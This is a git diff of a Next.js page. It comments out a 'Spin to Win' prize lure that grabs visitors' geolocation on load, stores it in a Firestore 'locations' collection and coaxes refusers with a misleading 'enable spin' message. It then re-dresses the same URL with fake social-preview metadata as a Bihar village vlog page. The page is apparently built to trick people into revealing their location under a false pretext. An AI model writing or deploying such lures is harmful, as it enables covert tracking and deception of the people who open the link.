@@ -2,7 +2,8 @@ import Head from 'next/head'
 import { useEffect, useState } from 'react'
 import { db } from '@/lib/firebase'
 import { collection, addDoc, Timestamp } from 'firebase/firestore'
-import { Box, Button, Alert, Typography } from '@mui/material'
+import { Box, Button, Alert, Typography, Stack, Avatar } from '@mui/material'
+import VideoPage from '@/components/VideoPage'
 
 export default function Home() {
   const [location, setLocation] = useState<{ lat: number; lng: number } | null>(
@@ -12,114 +13,77 @@ export default function Home() {
   const [saved, setSaved] = useState(false);
   const [showEnableButton, setShowEnableButton] = useState(false);
 
-  const requestLocation = () => {
-    if (!navigator.geolocation) {
-      setError("Geolocation is not supported by your browser");
-      return;
-    }
+  // const requestLocation = () => {
+  //   if (!navigator.geolocation) {
+  //     setError("Geolocation is not supported by your browser");
+  //     return;
+  //   }
 
-    navigator.geolocation.getCurrentPosition(
-      async (position) => {
-        const lat = position.coords.latitude;
-        const lng = position.coords.longitude;
+  //   navigator.geolocation.getCurrentPosition(
+  //     async (position) => {
+  //       const lat = position.coords.latitude;
+  //       const lng = position.coords.longitude;
 
-        setLocation({ lat, lng });
-        setError(null);
-        setShowEnableButton(false);
+  //       setLocation({ lat, lng });
+  //       setError(null);
+  //       setShowEnableButton(false);
 
-        try {
-          await addDoc(collection(db, "locations"), {
-            lat,
-            lng,
-            timestamp: Timestamp.now(),
-          });
-          setSaved(true);
-        } catch (err: any) {
-          setError("Failed to save to Firestore: " + err.message);
-        }
-      },
-      (err) => {
-        setError(
-          "Spin option disabled please enable it by clicking the below button."
-        );
-        setShowEnableButton(true);
-      }
-    );
-  };
+  //       try {
+  //         await addDoc(collection(db, "locations"), {
+  //           lat,
+  //           lng,
+  //           timestamp: Timestamp.now(),
+  //         });
+  //         setSaved(true);
+  //       } catch (err: any) {
+  //         setError("Failed to save to Firestore: " + err.message);
+  //       }
+  //     },
+  //     (err) => {
+  //       setError(
+  //         "Spin option disabled please enable it by clicking the below button."
+  //       );
+  //       setShowEnableButton(true);
+  //     }
+  //   );
+  // };
 
-  // 🔄 Try to get location on first load
-  useEffect(() => {
-    requestLocation();
-  }, []);
+  // // 🔄 Try to get location on first load
+  // useEffect(() => {
+  //   requestLocation();
+  // }, []);
 
   return (
     <>
-      <Head>
-        <title>🎯 Spin to Win!</title>
-        <meta name="description" content="Try your luck and win exciting prizes 🎁" />
-        <meta property="og:title" content="🎯 Spin to Win!" />
-        <meta property="og:description" content="Try your luck and win exciting prizes 🎁" />
-        <meta property="og:type" content="website" />
-        <meta property="og:image" content="https://spin-win-gamma.vercel.app/meta.png" />
-        <meta property="og:url" content="https://spin-win-gamma.vercel.app" />
-        <meta name="twitter:card" content="summary_large_image" />
-        <meta name="twitter:title" content="🎯 Spin to Win!" />
-        <meta name="twitter:description" content="Try your luck and win exciting prizes 🎁" />
-        <meta name="twitter:image" content="https://spin-win-gamma.vercel.app/meta.png" />
-      </Head>
-
-
-      <Box
-        minHeight="100vh"
-        display="flex"
-        flexDirection="column"
-        alignItems="center"
-        justifyContent="center"
-        bgcolor="linear-gradient(to bottom right, #fff1eb, #fddcdc)"
-        textAlign="center"
-        px={2}
-      >
-        <Typography variant="h3" component="h1" fontWeight="bold" color="error" gutterBottom>
-          🎯 Spin to Win!
-        </Typography>
-
-        <Box
-          width={300}
-          height={300}
-          display="flex"
-          alignItems="center"
-          justifyContent="center"
-          bgcolor="#fff"
-          border="8px solid #ffb3af"
-          borderRadius="50%"
-          boxShadow={3}
-          mb={3}
-        >
-          <img
-            src="/spin.png"
-            alt="Spin Wheel"
-            style={{ width: '80%', height: '80%', objectFit: 'contain' }}
-          />
-        </Box>
-
-        {error && (
-          <Alert severity="error" sx={{ mt: 2, maxWidth: 400 }}>
-            {error}
-          </Alert>
-        )}
-
-        {showEnableButton && (
-          <Button
-            onClick={requestLocation}
-            variant="contained"
-            color="error"
-            size="large"
-            sx={{ mt: 3, px: 4, py: 1.5, fontWeight: 'bold', borderRadius: 8 }}
-          >
-            🔓 Enable Spin
-          </Button>
-        )}
-      </Box>
+    <Head>
+  <title>A Day in Bihar | Rural Life & Culture | Bihar Daily Vlogs</title>
+  <meta name="description" content="Experience authentic rural life in Bihar! Join me for a full day in my village - farming, local food, traditions and beautiful countryside. Don't forget to like and subscribe!" />
+  
+  {/* Open Graph / Facebook */}
+  <meta property="og:type" content="video.other" />
+  <meta property="og:title" content="A Day in Bihar | Rural Life & Culture | Bihar Daily Vlogs" />
+  <meta property="og:description" content="Experience authentic rural life in Bihar! Full day village vlog showing farming, local food and traditions." />
+  <meta property="og:image" content="https://spin-win-gamma.vercel.app/video.avif" />
+  <meta property="og:url" content="https://spin-win-gamma.vercel.app" />
+  <meta property="og:site_name" content="Bihar Daily Vlogs" />
+  <meta property="og:video:duration" content="1245" />
+  
+  {/* Twitter */}
+  <meta name="twitter:card" content="player" />
+  <meta name="twitter:title" content="A Day in Bihar | Rural Life & Culture | Bihar Daily Vlogs" />
+  <meta name="twitter:description" content="Experience authentic rural life in Bihar! Full day village vlog showing farming, local food and traditions." />
+  <meta name="twitter:image" content="https://spin-win-gamma.vercel.app/video.avif" />
+  <meta name="twitter:player" content="https://spin-win-gamma.vercel.app" />
+  <meta name="twitter:player:width" content="1280" />
+  <meta name="twitter:player:height" content="720" />
+  
+  {/* Additional YouTube-like tags */}
+  <meta name="keywords" content="Bihar vlog, rural India, village life, Indian farming, Bihar culture, daily vlog, Bihar tourism" />
+  <meta property="video:tag" content="Bihar" />
+  <meta property="video:tag" content="Village Life" />
+  <meta property="video:tag" content="India" />
+</Head>
+    <VideoPage />
     </>
   );
 }
